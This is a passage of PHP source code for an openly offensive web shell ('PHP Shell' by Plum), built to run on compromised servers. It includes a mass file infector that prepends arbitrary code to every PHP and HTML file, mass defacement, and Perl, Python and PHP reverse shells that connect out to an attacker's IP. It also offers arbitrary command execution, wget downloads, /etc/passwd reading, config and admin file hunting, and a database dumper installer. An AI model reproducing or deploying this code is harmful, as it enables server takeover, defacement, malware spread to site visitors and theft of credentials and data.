			echo "<a href='?edit=$filename'>$filename</a><br>";
		}
	}
	echo "<br>Search results that contain 'config' in directory names.<br>";
	foreach(mass_files($rootdir, true) as $key => $filename) {
		$basename = pathinfo($filename, PATHINFO_BASENAME);
		if(preg_match('/config/', $basename)) {
			echo "<a href='?edit=$filename'>$filename</a><br>";
		}
	}
}

//Admin finder
if(isset($_GET['adminFinder'])) {
	echo "Search results that contain 'admin' in directory names.<br>";
	foreach(mass_files($rootdir, true) as $key => $filename) {
		$basename = pathinfo($filename, PATHINFO_BASENAME);
		if(preg_match('/admin/', $basename)) {
			echo "<a href='?edit=$filename'>$filename</a><br>";
		}
	}
	echo "<br>Search results that contain 'admin' in file names.<br>";
	foreach(mass_files($rootdir, false) as $key => $filename) {
		$basename = pathinfo($filename, PATHINFO_BASENAME);
		if(preg_match('/admin/', $basename)) {
			echo "<a href='?edit=$filename'>$filename</a><br>";
		}
	}
}

//Hash generator
if(isset($_GET['hashGenerator'])) {
	echo "<center>
			<form action='' method='post'>
				String to hash:<br>
				<input type='text' name='string'>
				<input type='submit' name='generate_hashes' value='Hash'>
			</form>
		</center>";
}
if(isset($_POST['generate_hashes'])) {
	$string = $_POST['string'];
	$md5 = md5($string);
	$md52 = md5(md5($string));
	$md53 = md5(md5(md5($string)));
	$sha1 = sha1($string);
	$sha12 = sha1(sha1($string));
	$sha13 = sha1(sha1(sha1($string)));
	$joomlasalt = salt_gen("4");
	$joomlahash = md5($string.$joomlasalt);
	$oscommsalt = salt_gen("2");
	$oscommhash = md5($oscommsalt.$string);
	$vbsalt = salt_gen("3");
	$vbhash = md5(md5($string).$vbsalt);
	$vbsalt2 = salt_gen("30");
	$vbhash2 = md5(md5($string).$vbsalt2);
	$mybbsalt = salt_gen("8");
	$mybbhash = md5(md5($mybbsalt).md5($string));
	$mybbsalt2 = salt_gen("8");
	$mybbhash2 = md5(md5($mybbsalt2).$string);
	$ipbsalt = salt_gen("5");
	$ipbhash = md5(md5($ipbsalt).md5($string));
	echo "<center>
			<textarea cols='120' rows='25' readonly>";
			echo 'md5($pass): '.$md5."\n";
			echo 'md5(md5($pass)): '.$md52."\n";
			echo 'md5(md5(md5($pass))): '.$md53."\n";
			echo 'sha1($pass): '.$sha1."\n";
			echo 'sha1(sha1($pass)): '.$sha12."\n";
			echo 'sha1(sha1(sha1($pass))): '.$sha13."\n";
			echo 'md5($pass.$salt) (Joomla): '.$joomlahash.':'.$joomlasalt."\n";
			echo 'md5($salt.$pass) (osCommerce): '.$oscommhash.':'.$oscommsalt."\n";
			echo 'md5(md5($pass).$salt) (vBulletin < 3.8.5): '.$vbhash.':'.$vbsalt."\n";
			echo 'md5(md5($pass).$salt) (vBulletin >= 3.8.5): '.$vbhash2.':'.$vbsalt2."\n";
			echo 'md5(md5($salt).$pass) (MyBB < 1.2): '.$mybbhash2.':'.$mybbsalt2."\n";
			echo 'md5(md5($salt).md5($pass)) (MyBB 1.2+): '.$mybbhash.':'.$mybbsalt."\n";
			echo 'md5(md5($salt).md5($pass)) (IPB 2+): '.$ipbhash.':'.$ipbsalt."\n";
	echo "</textarea>
		</center>";
}

//Extract files
if(isset($_GET['extract'])) {
	$file = $_GET['extract'];
	$epath = $_GET['epath'];
	$type = $_GET['type'];
	extract_file($file, $epath, $type);
}

//Infect files
if(isset($_POST['do_infect'])) {
	$infdir = rtrim($_POST['infect_dir'], '/');
	$type = $_POST['infect_type'];
	$infcode = $_POST['infect_code'];
	if(is_dir($infdir)) {
		$success = 0;
		$failed = 0;
		foreach(mass_files($infdir, false) as $key => $files) {
			$exten = pathinfo($files, PATHINFO_EXTENSION);
			if($type == 'php') {
				if($exten == 'php') {
					$content = $infcode;
					$content .= file_get_contents($files);
					if(file_put_contents($files, $content)) {
						echo "<font color='green'><b>Successfully infected file: $files</b></font></br>";
						$success++;
					} else {
						echo "<font color='red'><b>Failed to infect file: $files</b></font></br>";
						$failed++;
					}
				}
			} elseif($type == 'html') {
				if($exten == 'html') {
					$content = $infcode;
					$content .= file_get_contents($files);
					if(file_put_contents($files, $content)) {
						echo "<font color='green'><b>Successfully infected file: $files</b></font></br>";
						$success++;
					} else {
						echo "<font color='red'><b>Failed to infect file: $files</b></font></br>";
						$failed++;
					}
				}
			} elseif($type == 'both') {
				if($exten == 'html' or $exten == 'php') {
					$content = $infcode;
					$content .= file_get_contents($files);
					if(file_put_contents($files, $content)) {
						echo "<font color='green'><b>Successfully infected file: $files</b></font></br>";
						$success++;
					} else {
						echo "<font color='red'><b>Failed to infect file: $files</b></font></br>";
						$failed++;
					}
				}
			}
		}
		echo "A total of $success files were infected!<br>A total of $failed files failed to be infected!";
	} else {
		error("$infdir is not a valid directory!");
	}
}
if(isset($_GET['fileInfect'])) {
	echo "<center>
			This will append your infect code to the top of every file in the given directory.<br>
			<form action='' method='post'>
				Directory to infect: <input type='text' name='infect_dir' value='$rootdir'>
				File types to infect: 
				<select name='infect_type'>
					<option value='php'>PHP</option>
					<option value='html'>HTML</option>
					<option value='both'>Both</option>
				</select><br>
				Code to infect files with:<br>
				<textarea name='infect_code' cols='110' rows='20'></textarea><br>
				<input type='submit' name='do_infect' value='Infect'>
			</form>
		</center>";
}

//Deface files
if(isset($_POST['do_deface'])) {
	$defdir = rtrim($_POST['deface_dir'], '/');
	$type = $_POST['deface_type'];
	$defsource = $_POST['deface_source'];
	if(is_dir($defdir)) {
		$success = 0;
		$failed = 0;
		foreach(mass_files($defdir, false) as $key => $files) {
			$exten = pathinfo($files, PATHINFO_EXTENSION);
			if($type == 'php') {
				if($exten == 'php') {
					if($files != __FILE__) {
						if(file_put_contents($files, $defsource)) {
							echo "<font color='green'><b>Successfully defaced file: $files</b></font></br>";
							$success++;
						} else {
							echo "<font color='red'><b>Failed to deface file: $files</b></font></br>";
							$failed++;
						}
					}
				}
			} elseif($type == 'html') {
				if($exten == 'html') {
					if($files != __FILE__) {
						if(file_put_contents($files, $defsource)) {
							echo "<font color='green'><b>Successfully defaced file: $files</b></font></br>";
							$success++;
						} else {
							echo "<font color='red'><b>Failed to deface file: $files</b></font></br>";
							$failed++;
						}
					}
				}
			} elseif($type == 'both') {
				if($exten == 'html' or $exten == 'php') {
					if($files != __FILE__) {
						if(file_put_contents($files, $defsource)) {
							echo "<font color='green'><b>Successfully defaced file: $files</b></font></br>";
							$success++;
						} else {
							echo "<font color='red'><b>Failed to deface file: $files</b></font></br>";
							$failed++;
						}
					}
				}
			}
		}
		echo "A total of $success files were defaced!<br>A total of $failed files failed to be defaced!";
	} else {
		error("$defdir is not a valid directory!");
	}
}
if(isset($_GET['fileDeface'])) {
	echo "<center>
			This will deface every file in the given directory. This will not deface this shell.<br>
			<form action='' method='post'>
				Directory to deface: <input type='text' name='deface_dir' value='$rootdir'>
				File types to deface: 
				<select name='deface_type'>
					<option value='php'>PHP</option>
					<option value='html'>HTML</option>
					<option value='both'>Both</option>
				</select><br>
				Source to deface files with:<br>
				<textarea name='deface_source' cols='110' rows='20'></textarea><br>
				<input type='submit' name='do_deface' value='Deface'>
			</form>
		</center>";
}

//Install MSD
if(isset($_POST['install_msd'])) {
	if($_POST['version'] == "1") {
		$msd1link = $links['MSD1']['LINK'];
		$name = "msdv2.zip";
	} else {
		$msd1link = $links['MSD2']['LINK'];
		$name = "msd1.24.4.zip";
	}
	$msd1dir = rtrim($_POST['msd_dir'], '/');
	if(is_dir($msd1dir)) {
		$get = file_get_contents($msd1link);
		if(file_put_contents("$msd1dir/$name", $get)) {
			extract_file("$msd1dir/$name", $msd1dir, "zip");
		} else {
			error('Failed to write zip file to $msd1dir!');
		}
	} else {
		if(mkdir($msd1dir, 0777)) {
			$get = file_get_contents($msd1link);
			if(file_put_contents("$msd1dir/$name", $get)) {
				extract_file("$msd1dir/$name", $msd1dir, "zip");
			} else {
				error('Failed to write zip file to $msd1dir!');
			}
		} else {
			error('Failed to make directory $msd1dir!');
		}
	}
}
if(isset($_GET['installMSD'])) {
	echo "<center>
			<form action='' method='post'>
				<font size='4'>MySQL Dumper v2.1 By Plum</font><br>
				Directory to install to. If it doesn't exist it will try and create it.<br>
				<input type='text' name='msd_dir' value='$dir/msd' size='50'>
				<input type='hidden' name='version' value='1'>
				<input type='submit' name='install_msd' value='Install'>
			</form>
		</center>";
}
if(isset($_GET['installMSD2'])) {
	echo "<center>
			<form action='' method='post'>
				<font size='4'>MySQL Dumper v1.24.4 By <a href='http://www.mysqldumper.net/'>http://www.mysqldumper.net/</a></font><br>
				Directory to install to. If it doesn't exist it will try and create it.<br>
				<input type='text' name='msd_dir' value='$dir/msd' size='50'>
				<input type='hidden' name='version' value='2'>
				<input type='submit' name='install_msd' value='Install'>
			</form>
		</center>";
}

//Back connect
if(isset($_POST['bcpl_connect'])) {
	$ip = $_POST['bcpl_ip'];
	$port = $_POST['bcpl_port'];
	if(can_exe()) {
		if(file_exists("/tmp/bc.pl")) {
			echo "<center>
					Trying to connect to $ip on port $port<br>
					The response from 'perl /tmp/bc.pl $ip $port' was:<br>
					<textarea cols='120' rows='25'>".exe_cmd("perl /tmp/bc.pl $ip $port")."</textarea>
				</center>";
		} else {
			error("/tmp/bc.pl does not exist!");
		}
	} else {
		error("Can not execute commands! A Perl script needs to be ran to spawn this reverse shell!");
	}		
}
if(isset($_GET['bcPerl'])) {
	if(can_exe()) {
		if(is_dir('/tmp')) {
			if(file_put_contents('/tmp/bc.pl', base64_decode($bcpl))) {
				success("Successfully wrote /tmp/bc.pl!");
				echo "<center>
						<form action='' method='post'>
							IP: <input type='text' name='bcpl_ip' value='$yourip'>
							Port: <input type='text' name='bcpl_port' value='2121' size='3'>
							<input type='submit' name='bcpl_connect' value='Connect'><br>
							Use: 'nc -l -v -p PORT' Remember your port must be forwarded!
						</form>
					</center>";
			} else {
				error("Failed to write Perl source to /tmp/bc.pl!");
			}
		} else {
			error('/tmp is not a directory!');
		}
	} else {
		error("Can not execute commands! A Perl script needs to be ran to spawn this reverse shell!");
	}
}

if(isset($_POST['bcpy_connect'])) {
	$ip = $_POST['bcpy_ip'];
	$port = $_POST['bcpy_port'];
	if(can_exe()) {
		if(file_exists("/tmp/bc.py")) {
			echo "<center>
					Trying to connect to $ip on port $port<br>
					The response from 'python /tmp/bc.py $ip $port' was:<br>
					<textarea cols='120' rows='25'>".exe_cmd("python /tmp/bc.py $ip $port")."</textarea>
				</center>";
		} else {
			error("/tmp/bc.py does not exist!");
		}
	} else {
		error("Can not execute commands! A Python script needs to be ran to spawn this reverse shell!");
	}		
}
if(isset($_GET['bcPython'])) {
	if(can_exe()) {
		if(is_dir("/tmp")) {
			if(file_put_contents('/tmp/bc.py', base64_decode($bcpy))) {
				success("Successfully wrote /tmp/by.py");
				echo "<center>
						<form action='' method='post'>
							IP: <input type='text' name='bcpy_ip' value='$yourip'>
							Port: <input type='text' name='bcpy_port' value='2121' size='3'>
							<input type='submit' name='bcpy_connect' value='Connect'><br>
							Use 'nc -l -v -p PORT' Remember your port must be forwarded!
						</form>
					</center>";
			} else {
				error("Failed to write Python source to /tmp/by.py");
			}
		} else {
			error("/tmp is not a directory!");
		}
	} else {
		error("Can not execute commands! A Python script needs to be ran to spawn this reverse shell!");
	}
}

if(isset($_POST['bcphp_connect'])) {
	$ip = $_POST['bcphp_ip'];
	$port = $_POST['bcphp_port'];
	echo "<center>Trying to connect!</center>";
	$sockopen = fsockopen($ip , $port , $errno, $errstr);
	if(!$sockopen) {
		error("Failed to open socket!");
	} elseif($errno != 0) {
		error("$errno: $errstr");
	} else {
		fputs($sockopen, "\n[+]PHP Back Connection[+]\n\n");
		$uname = exe_cmd("uname -a");
		$id = exe_cmd("id");
		fputs($sockopen, "$uname$id\n");
		while(!feof($sockopen)) {
			fputs($sockopen, "> ");
			$command = fgets($sockopen);
			fputs($sockopen , exe_cmd($command));
		}
		fclose($sockopen);
	}
}
if(isset($_GET['bcPHP'])) {
	if(can_exe()) {
		echo "<center>
				<form action='' method='post'>
					IP: <input type='text' name='bcphp_ip' value='$yourip'>
					Port: <input type='text' name='bcphp_port' value='2121' size='3'>
					<input type='submit' name='bcphp_connect' value='Connect'><br>
					Use 'nc -l -v -p PORT' Remember your port must be forwarded!
				</form>
			</center>";
	} else {
		error("Can not execute commands! Commands need to be executed for this reverse shell to work!");
	}
}

//System stuff
if(isset($_GET['users'])) {
	if(file_exists('/etc/passwd')) {
		$getfile = file_get_contents('/etc/passwd');
		$exline = explode("\n", $getfile);
		echo "<table>
				<tr>
					<th>Username</th>
					<th>Password?</th>
					<th>UID</th>
					<th>GID</th>
					<th>UID Info</th>
					<th>Home Directory</th>
					<th>Command/Shell</th>
				</tr>";
		foreach($exline as $exl) {
			echo "<tr>";
			$excol = explode(":", $exl);
			foreach($excol as $exc) {
				echo "<td>$exc</td>";
			}
			echo "</tr>";
		}
		echo "</table>";
	} else {
		error("/etc/passwd does not exist!");
	}
}

if(isset($_GET['processes'])) {
	if(can_exe()) {
		$processes = exe_cmd("ps aux");
		$stripfirstline = substr($processes, strpos($processes, "\n")+1);
		$exline = explode("\n", $stripfirstline);
		echo "<div id='hover'>
				<table width='100%' border='1'>
					<tr>
						<th>Kill</th>
						<th>USER</th>
						<th>PID</th>
						<th>%CPU</th>
						<th>%MEM</th>
						<th>VSZ</th>
						<th>RSS</th>
						<th>TTY</th>
						<th>STAT</th>
						<th>START</th>
						<th>TIME</th>
						<th>COMMAND</th>
					</tr>";
		foreach($exline as $exl) {
			echo "<tr>";
			$exsp = array_values(array_filter(explode(" ", $exl), 'strlen'));
			if(count($exsp) > 11) {
				$slice = array_slice($exsp, 0, 10);
				echo "<td><a href='?killProccess=".$exsp[1]."'>Kill</a></td>";
				foreach($slice as $s) {
					echo "<td>$s</td>";
				}
				$slice2 = array_slice($exsp, 10);
				echo "<td>".implode(" ", $slice2)."</td>";
			} else {
				echo "<td><a href='?killProccess=".$exsp[1]."'>Kill</a></td>";
				foreach($exsp as $e) {
					echo "<td>$e</td>";
				}
			}
			echo "</tr>";
		}
		echo "</table></div>";
	} else {
		error("Can not execute commands! Must execute 'ps aux' to get processes.");
	}
}

if(isset($_GET['memory'])) {
	if(file_exists('/proc/meminfo')) {
		$raminfo = file_get_contents('/proc/meminfo');
		echo "Ram:<br><pre>$raminfo</pre><br><br>";
	} else {
		error("/proc/meminfo does not exist!");
	}
	$hddfree = disk_free_space("/");
	$hddtotal = disk_total_space("/");
	$hddused = $hddtotal - $hddfree;
	$hddpercent = round(($hddused / $hddtotal) * 100);
	echo "HDD:<br>Total Space: ".ByteConversion($hddtotal)."<br>Free Space: ".ByteConversion($hddfree)."<br>Used Space: ".ByteConversion($hddused)."<br>Percent Used: ~$hddpercent%";
}

if(isset($_GET['cpu'])) {
	if(file_exists('/proc/cpuinfo')) {
		$cpuinfo = file_get_contents('/proc/cpuinfo');
		echo "<center>
				CPU Information:<br>
				<textarea cols='120' rows='20'>$cpuinfo</textarea>
			</center>";
	} else {
		error('/proc/cpuinfo does not exist!');
	}
}

//Execute command
if(isset($_POST['exe_cmd'])) {
	$command = $_POST['command'];
	if(can_exe()) {
		echo "<center>
				<form action='' method='post'>
					<input type='text' name='command' size='75'>
					<input type='submit' name='exe_cmd'>
				</form>
				The response from '$command' was:<br>
				<textarea cols='100' rows='20'>".exe_cmd($command)."</textarea>
			</center>";
	} else {
		error("Can not execute commands!");
	}
}

//Create file
if(isset($_POST['create_file'])) {
	$createpath = $_POST['create_file_path'];
	if(!file_exists($createpath)) {
		if(fopen($createpath, "w+")) {
			redirect("?edit=$createpath");
		} else {
			error("Failed to create file!");
		}
	} else {
		error("File already exists! You can view it <a href='?edit=$createpath'>here</a>.");
	}
}
//Create directory
if(isset($_POST['create_dir'])) {
	$dirpath = $_POST['create_dir_path'];
	if(!is_dir($dirpath)) {
		if(mkdir($dirpath, 0777)) {
			redirect("?dir=$dirpath");
		} else {
			error("Failed to make directory!");
		}
	} else {
		error("This directory already exists! You can view it <a href='?dir=$dirpath'>here</a>.");
	}
}

//wget file
if(isset($_POST['do_wget'])) {
	$fileurl = $_POST['wget_file'];
	if(can_exe()) {
		echo "<center>
				The response from 'wget $fileurl' was:<br>
				<textarea cols='120' rows='20'>".exe_cmd("wget $fileurl")."</textarea>
			</center>";
	} else {
		error("Commands can not be executed!");
	}
}

//Upload file
if(isset($_POST['do_upload'])) {
	$uploaddir = $_POST['upload_dir'];
	$uploadname = $_FILES['upload_file']['name'];
	if(!file_exists("$uploaddir/$uploadname")) {
		if(move_uploaded_file($_FILES['upload_file']['tmp_name'], "$uploaddir/$uploadname")) {
			redirect("?dir=$uploaddir");
		} else {
			error("Failed to upload file!");
		}
	} else {
		error("File already exists! You can view it <a href='?edit=$uploaddir$uploadname'>here</a>.");
	}
}

//Mass files
if(isset($_POST['mass_action'])) {
	$action = $_POST['action'];
	$checked = $_POST['massbox'];
	if($action == 'delete') {
		foreach($checked as $c) {
			if(is_dir($c)) {
				if(rmdir($c)) {
					echo "<font color='green'><b>Successfully deleted directory: $c</font><br>";
				} else {
					echo "<font color='red'><b>Failed to delete directory: $c</font><br>";
				}
			} else {
				if(unlink($c)) {
					echo "<font color='green'><b>Successfully deleted file: $c</font><br>";
				} else {
					echo "<font color='red'><b>Failed to delete file: $c</font><br>";
				}
			}
		}
	} elseif($action == 'chmod') {
		$chvalue = $_POST['chmod_value'];
		foreach($checked as $c) {
			if(chmod($c, $chvalue)) {
				echo "<font color='red'><b>Successfully chmod'd file: $c to: $chvalue</font><br>";
			} else {
				echo "<font color='red'><b>Failed to chmod file: $c to: $chvalue</font><br>";
			}
		}
	} else {
		error('Invalid action specified!');
	}
}

//Display disabled functions
if(isset($_GET['disabledFunctions'])) {
	echo "Disabled functions:<br>";
	$ex = explode(",", $disabledfunc);
	foreach($ex as $e) {
		echo "$e<br>";
	}
}

//Kill proccess
if(isset($_GET['killProcess'])) {
	$id = $_GET['killProcess'];
	if(posix_kill($id)) {
		success("Successfully killed process: $id");
	} else {
		error("Failed to kill process: $id");
	}
}

//Check links
if(isset($_GET['checkLinks'])) {
	echo "<table border='1'>
			<tr>
				<th>Link</th>
				<th>Status</th>
				<th>MD5</th>
				<th>Description</td>
			</tr>";
	foreach($links as $key => $ar) {
		$link = $ar['LINK'];
		$md5 = $ar['MD5'];
		$desc = $ar['DESC'];
		$headers = @get_headers($link);
		echo "<tr>";
		echo "<td><a href='$link'>$link</a></td>";
		if($headers[0] != "HTTP/1.1 403 FORBIDDEN" or $headers[0] != "HTTP/1.1 404 Not Found") {
			echo "<td><font color='green'><b>OK</b></font></td>";
		} else {
			echo "<td><font color='red'><b>Not Found</b></font></td>";
		}
		if(md5_file($link) == $md5) {
			echo "<td><font color='green'><b>Match</b></font></td>";
		} else {
			echo "<td><font color='red'><b>No Match</b></font></td>";
		}
		echo "<td>$desc</td>";
		echo "</tr>";
	}
	echo "</table>";
}

//Credits
if(isset($_GET['credits'])) {
	echo "<center>
			<font size='6'><b>PHP Shell v$version</font></b><br>
			Written By: Plum (@PlumLulz or plumm@jabber.org)<br>
			Nav Bar: Bootstrap (<a href='http://getbootstrap.com/'>http://getbootstrap.com/</a>)<br>
			MySQL Dumper v2.1: Plum (@PlumLulz or plumm@jabber.org)<br>
			MySQL Dumper 1.24.4: <a href='http://mysqldumper.net'>http://mysqldumper.net</a><br>
			Perl Reverse Shell: pentestmonkey@pentestmonkey.net<br>
			Python Reverse Shell: Xavier Garcia (<a href='http://www.shellguardians.com'>http://www.shellguardians.com</a>)<br>
			I think that is about it. Enjoy!
		</center>";
}

//Kill
if(isset($_GET['kill'])) {
	if(unlink(__FILE__)) {
		success("Successfully killed shell!");
	} else {
		error("Failed to kill shell!");
	}
}

//Let's get the files and directories for the current dir
$open = opendir($dir);
$files = array();
$direcs = array();
while ($file = readdir($open)) {
    if ($file != "." && $file != "..") {
        if (is_dir("$dir/$file")) {
            array_push($direcs, $file);
        } else {
            array_push($files, $file);
        }
    }
}
asort($direcs);
asort($files);

//Let's display those files and dirs
//Starting with directories first.
echo <<<html
<br><br>
<table width='100%' border='1'>
	<tr>
		<th>Current Directory: 
html;
$ex = explode("/", $dir);
for ($p = 0; $p < count($ex); $p++) {
    @$linkpath.=$ex[$p] . '/';
    $linkpath2 = rtrim($linkpath, "/");
    echo "<a href='?dir=$linkpath2'>$ex[$p]</a>/";
}
echo <<<html
		</th>
	</tr>
</table>

<form action='' method='post'>
	<div id="hover">
		<table width='100%' border='1'>
			<tr>
				<th>File/Dir Name</th>
				<th>Permissions</th>
				<th>Writeable</th>
				<th>Owner/Group</th>
				<th>Size</th>
				<th>Last Modified</th>
				<th>Delete</th>
				<th>Rename</th>
				<th>Mass</th>
			</tr>
html;
//Display directories
foreach($direcs as $dirs) {
	$perms = substr(base_convert(fileperms("$dir/$dirs"), 10, 8), 2);
	$writeable = is_writeable("$dir/$dirs") ? "<font color='green'><b>Writeable</b></font>" : "<font color='red'><b>Not Writeable</b></font>";
	$owner = fileowner("$dir/$dirs");
	$group = filegroup("$dir/$dirs");
	$size = "Directory";
	$lastmod = date("F d Y g:i:s", filemtime("$dir/$dirs"));
	echo <<<html
	<tr>
		<td><a href='?dir=$dir/$dirs'>$dirs</a></td>
		<td style="text-align: center;">$perms</td>
		<td style="text-align: center;">$writeable</td>
		<td style="text-align: center;">$owner/$group</td>
		<td>$size</td>
		<td>$lastmod</td>
		<td><a href='?delD=$dir/$dirs'>Delete</a></td>
		<td><a href='?rename=$dirs&rdir=$dir'>Rename</a></td>
		<td><input type='checkbox' name='massbox[]' value='$dir/$dirs'></td>
	</tr>
html;
}

//Display files now
foreach($files as $file) {
	$perms = substr(base_convert(fileperms("$dir/$file"), 10, 8), 2);
	$writeable = is_writeable("$dir/$file") ? "<font color='green'><b>Writeable</b></font>" : "<font color='red'><b>Not Writeable</b></font>";
	$owner = fileowner("$dir/$file");
	$group = filegroup("$dir/$file");
	$size = ByteConversion(filesize("$dir/$file"));
	$lastmod = date("F d Y g:i:s", filemtime("$dir/$file"));
	$extension = pathinfo("$dir/$file", PATHINFO_EXTENSION);
	echo "<tr>";
	if(in_array($extension, $compression)) {
		echo "<td><a href='?extract=$dir/$file&epath=$dir&type=$extension'>$file</a></td>";
	} else {
		echo "<td><a href='?edit=$dir/$file'>$file</a></td>";
	}
	echo <<<html
		<td style="text-align: center;">$perms</td>
		<td style="text-align: center;">$writeable</td>
		<td style="text-align: center;">$owner/$group</td>
		<td>$size</td>
		<td>$lastmod</td>
		<td><a href='?delF=$dir/$file'>Delete</a></td>
		<td><a href='?rename=$file&rdir=$dir'>Rename</a></td>
		<td><input type='checkbox' name='massbox[]' value='$dir/$file'></td>
	</tr>
html;
}
echo <<<html
		</table>
	</div>
<div style='position:absolute; right:0%;'>
	<select name='action'>
		<option value='delete'>Delete</option>
		<option value='chmod'>chmod</option>
	</select>
	<input type='text' name='chmod_value' class='text' value='077' size='9'>
	<input type='submit' name='mass_action' value='Do Action'>
</div>
</form>
<br>
<br>
<br>
html;

if(is_writeable($dir)) {
	$writeable = "<font color='green'><b>[ Writeable ]</b></font>";
} else {
	$writeable = "<font color='red'><b>[ Not Writeable ]</b></font>";
}
echo "<table width='100%' border='1'>
		<tr>
			<td>
				<center>
					<form action='' method='post'>
						Create File:<br>
						<input type='text' name='create_file_path' size='55' value='$dir/newfile.php'>
						<input type='submit' name='create_file' value='Create'><br>
						$writeable
					</form>
				</center>
			</td>
			<td>
				<center>
					<form action='' method='post'>
						Create Directory:<br>
						<input type='text' name='create_dir_path' size='55' value='$dir/newdir'>
						<input type='submit' name='create_dir' value='Create'><br>
						$writeable
					</form>
				</center>
			</td>
		</tr>
		<tr>
			<td>
				<center>
					<form action='' method='get'>
						Edit File:<br>
						<input type='text' name='edit' size='55' value='$dir/index.php'>
						<input type='submit' value='Edit'>
					</form>
				</center>
			</td>
			<td>
				<center>
					<form action='' method='get'>
						Go To Directory:<br>
						<input type='text' name='dir' size='55' value='/tmp'>
						<input type='submit' value='Go'>
					</form>
				</center>
			</td>
		</tr>
		<tr>
			<td>
				<center>
					<form action='' method='post' enctype='multipart/form-data'>
						Upload To Directory:<br>
						<input type='text' name='upload_dir' size='55' value='$dir'><br>
						<input type='file' name='upload_file'>
						<input type='submit' name='do_upload' value='Upload'><br>
						$writeable
					</form>
				</center>
			</td>
			<td>
				<center>
					<form action='' method='post'>
						wget file:<br>
						<input type='text' name='wget_file' size='55' value='http://'>
						<input type='submit' name='do_wget' value='wget'>
					</form>
				</center>
			</td>
		</tr>
		<tr>
			<td colspan='2'>
				<center>
					<form action='' method='post'>
						Execute Command:<br>
						<input type='text' name='command' size='65'>
						<input type='submit' name='exe_cmd' value='Execute'>
					</form>
				</center>
			</td>
		</tr>					
	</table>
	<br>
	<br>";
					
?>
